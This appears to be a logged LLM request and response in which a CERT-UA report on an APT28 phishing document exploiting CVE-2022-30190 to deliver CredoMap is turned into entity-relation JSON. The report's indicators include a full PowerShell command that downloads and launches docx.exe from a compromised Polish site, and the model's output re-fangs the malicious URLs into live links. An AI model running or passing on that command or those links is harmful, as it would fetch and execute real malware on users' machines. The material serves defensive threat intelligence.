@@ -1,0 +1,199 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Security Vulnerability: A flaw or weakness in software, hardware, or a system that can be exploited to compromise security. (also: Software Vulnerability, Vulnerability, Common Vulnerabilities and Exposures)
+- Software Product: An application, operating system, or suite of computer programs designed to perform specific tasks or functions. (also: Software, Software Application)
+- Software Vendor: An organization or company that develops, distributes, or maintains software, hardware, or related technology products and services. (also: Technology Vendor, Software Developer, Vendor)
+- Country: A distinct territorial body or sovereign state with its own government and defined geographical borders. (also: Nation, Sovereign State)
+- Government Organization: An official agency, ministry, or administrative body operating as part of a national or state government. (also: Government Agency, Government Body, State Authority)
+- Malware: Malicious software, code, or executables designed to infiltrate, damage, or compromise computer systems and data. (also: Malicious Software, Malware Family, Malware Strain)
+- Uniform Resource Locator: A standardized web address specifying the location and retrieval mechanism of a resource on a computer network. (also: URL, Web Address, Web Link)
+- Person: An individual human being, such as a government official, cybersecurity expert, researcher, or executive. (also: Individual, Natural Person)
+- IP Address: A numerical label assigned to a device connected to a computer network that uses the Internet Protocol for communication. (also: Internet Protocol Address)
+- Email Address: A unique identifier used to send and receive electronic mail messages over a computer network. (also: E-mail Address, Electronic Mail Address)
+- Computer File: A digital resource or named item stored on a computer system, containing data, code, or instructions. (also: File, Digital File, Filename)
+- Company: A commercial business, corporation, or enterprise operating in any economic sector or industry. (also: Enterprise, Corporation, Commercial Organization)
+- Domain Name: A human-readable identification string defining a realm of administrative autonomy or resource location within the Internet Domain Name System. (also: Internet Domain, FQDN, Fully Qualified Domain Name)
+- Threat Actor: An individual, group, or organization responsible for malicious cyber activities, attacks, or cyber espionage operations. (also: Threat Group, Cyber Threat Actor, Hacker Group)
+
+### KNOWN RELATION TYPES ###
+- publishes-advisory: The subject vendor or organization releases or issues a security advisory or patch update.
+- fixes-vulnerability-in: The subject security advisory or update remediates vulnerabilities found in the object software product.
+- affects: The subject vulnerability or malware impacts, targets, or compromises the object software, system, or organization.
+- located-in: The subject entity is based in, operates within, or belongs to the object country or geographic area.
+- part-of: The head entity is a component, sub-application, or structural member of the tail entity.
+- hosts: The subject network infrastructure, host, or server hosts or provides access to the object resource or payload.
+- delivers: The subject malware, file, or campaign installs, drops, or initiates the execution of the object malware payload.
+- redirects-to: The subject script, webpage, or file redirects user traffic or execution to the object URL or host.
+- exploits: The subject threat actor or malware leverages or abuses the object security vulnerability to compromise systems.
+- uses: The subject threat actor or malware utilizes the object tool, infrastructure, or malware.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA виявлено шкідливий документ "Nuclear Terrorism A Very Real Threat.rtf" відкриття якого призведе до завантаження HTML-файлу та виконання JavaScript-коду (CVE-2022-30190), який забезпечить завантаження та запуск шкідливої програми CredoMap.</p><p>Мета-дані свідчать про модифікацію документу 09.06.2022, а отже його розповсюдження могло бути здійснене ще 10.06.2022.</p><p>За сукупністю характерних ознак вважаємо за можливе асоціювати виявлену активність з діяльністю групи APT28.&nbsp;</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">eafa11070f213f16efc030f625a423d1&nbsp; &nbsp; daaa271cee97853bf4e235b55cb34c1f03ea6f8d3c958f86728d41f418b0bf01&nbsp; &nbsp; Nuclear Terrorism A Very Real Threat.rtf
+ab6c70af19f7d41a443feb8ccb57d264&nbsp; &nbsp; 14ae02c521b85e60b11393ffc0da5e25946c4775a84995800b73398df4bceffb&nbsp; &nbsp; article.html
+56a504a34d2cfbfc7eaa2b68e34af8ad&nbsp; &nbsp; 9309fb2a3f326d0f2cc3f2ab837cfd02e4f8cb6b923b3b2be265591fd38f4961&nbsp; &nbsp; SQLite.Interop.dll (Легітимна DLL)
+d3bddb5de864afd7e4f5e56027f4e5ea&nbsp; &nbsp; 2318ae5d7c23bf186b88abecf892e23ce199381b22c8eb216ad1616ee8877933&nbsp; &nbsp; docx.exe (CredoMap)
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hXXp://kitten-268.frge[.]io/article.html
+hXXp://kompartpomiar[.]pl/grafika/SQLite.Interop.dll
+hXXp://kompartpomiar[.]pl/grafika/docx.exe
+162[.]241.216.236
+kitten-268.frge[.]io
+frge[.]io (потребує додаткового моніторингу)
+kompartpomiar[.]pl (вірогідно, скомпрометований веб-ресурс)
+seo@specialityllc[.]com
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%USERPROFILE%\docx.exe
+%USERPROFILE%\SQLite.Interop.dll
+cmd.exe /k powershell -NonInteractive -WindowStyle Hidden -NoProfile -command '&amp; {iwr http://kompartpomiar.pl/grafika/SQLite.Interop.dll -OutFile "C:\Users\$ENV:UserName\SQLite.Interop.dll";iwr http://kompartpomiar.pl/grafika/docx.exe -OutFile "C:\Users\$ENV:UserName\docx.exe";Start-Process "C:\Users\$ENV:UserName\docx.exe"}'
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p>
+
+=== RESPONSE (6.1s, in 2676 / out 1304 tok, STOP) ===
+APT28 activity involving a malicious RTF document exploiting CVE-2022-30190 to download and execute CredoMap malware hosted on compromised infrastructure.
+
+{
+  "entities": [
+    {
+      "name": "Nuclear Terrorism A Very Real Threat.rtf",
+      "kind": "Computer File",
+      "gloss": "A malicious Rich Text Format document used in phishing attacks to trigger remote code execution."
+    },
+    {
+      "name": "CVE-2022-30190",
+      "kind": "Security Vulnerability",
+      "gloss": "A Microsoft Windows Support Diagnostic Tool (MSDT) remote code execution vulnerability commonly known as Follina."
+    },
+    {
+      "name": "CredoMap",
+      "kind": "Malware",
+      "gloss": "A malware family used by threat actors to compromise systems and steal credentials."
+    },
+    {
+      "name": "APT28",
+      "kind": "Threat Actor",
+      "gloss": "A Russian state-sponsored cyber espionage threat group associated with the GRU."
+    },
+    {
+      "name": "article.html",
+      "kind": "Computer File",
+      "gloss": "A malicious HTML file containing JavaScript code designed to download and execute secondary payloads."
+    },
+    {
+      "name": "SQLite.Interop.dll",
+      "kind": "Computer File",
+      "gloss": "A legitimate SQLite dynamic-link library downloaded alongside malicious payloads."
+    },
+    {
+      "name": "docx.exe",
+      "kind": "Computer File",
+      "gloss": "An executable payload file containing the CredoMap malware."
+    },
+    {
+      "name": "http://kitten-268.frge.io/article.html",
+      "kind": "Uniform Resource Locator",
+      "gloss": "A malicious URL hosting the HTML payload used in the attack."
+    },
+    {
+      "name": "http://kompartpomiar.pl/grafika/SQLite.Interop.dll",
+      "kind": "Uniform Resource Locator",
+      "gloss": "A URL on a compromised website hosting a SQLite dependency file."
+    },
+    {
+      "name": "http://kompartpomiar.pl/grafika/docx.exe",
+      "kind": "Uniform Resource Locator",
+      "gloss": "A URL on a compromised website used to distribute the CredoMap executable."
+    },
+    {
+      "name": "162.241.216.236",
+      "kind": "IP Address",
+      "gloss": "An IP address associated with network infrastructure observed in the incident."
+    },
+    {
+      "name": "kitten-268.frge.io",
+      "kind": "Domain Name",
+      "gloss": "A domain name used to stage and serve malicious HTML files."
+    },
+    {
+      "name": "frge.io",
+      "kind": "Domain Name",
+      "gloss": "An apex internet domain associated with infrastructure used during the campaign."
+    },
+    {
+      "name": "kompartpomiar.pl",
+      "kind": "Domain Name",
+      "gloss": "A compromised website domain used to host malicious executable files."
+    },
+    {
+      "name": "seo@specialityllc.com",
+      "kind": "Email Address",
+      "gloss": "An email address identified as an indicator of compromise in the incident."
+    }
+  ],
+  "relations": [
+    {
+      "head": "Nuclear Terrorism A Very Real Threat.rtf",
+      "type": "exploits",
+      "tail": "CVE-2022-30190",
+      "evidence": "Nuclear Terrorism A Very Real Threat.rtf\" відкриття якого призведе до завантаження HTML-файлу та виконання JavaScript-коду (CVE-2022-30190)"
+    },
+    {
+      "head": "Nuclear Terrorism A Very Real Threat.rtf",
+      "type": "delivers",
+      "tail": "CredoMap",
+      "evidence": "виконання JavaScript-коду (CVE-2022-30190), який забезпечить завантаження та запуск шкідливої програми CredoMap"
+    },
+    {
+      "head": "APT28",
+      "type": "uses",
+      "tail": "CredoMap",
+      "evidence": "вважаємо за можливе асоціювати виявлену активність з діяльністю групи APT28"
+    },
+    {
+      "head": "kitten-268.frge.io",
+      "type": "hosts",
+      "tail": "http://kitten-268.frge.io/article.html",
+      "evidence": "hXXp://kitten-268.frge[.]io/article.html"
+    },
+    {
+      "head": "kompartpomiar.pl",
+      "type": "hosts",
+      "tail": "http://kompartpomiar.pl/grafika/SQLite.Interop.dll",
+      "evidence": "hXXp://kompartpomiar[.]pl/grafika/SQLite.Interop.dll"
+    },
+    {
+      "head": "kompartpomiar.pl",
+      "type": "hosts",
+      "tail": "http://kompartpomiar.pl/grafika/docx.exe",
+      "evidence": "hXXp://kompartpomiar[.]pl/grafika/docx.exe"
+    }
+  ],
+  "newRelationTypes": []
+}
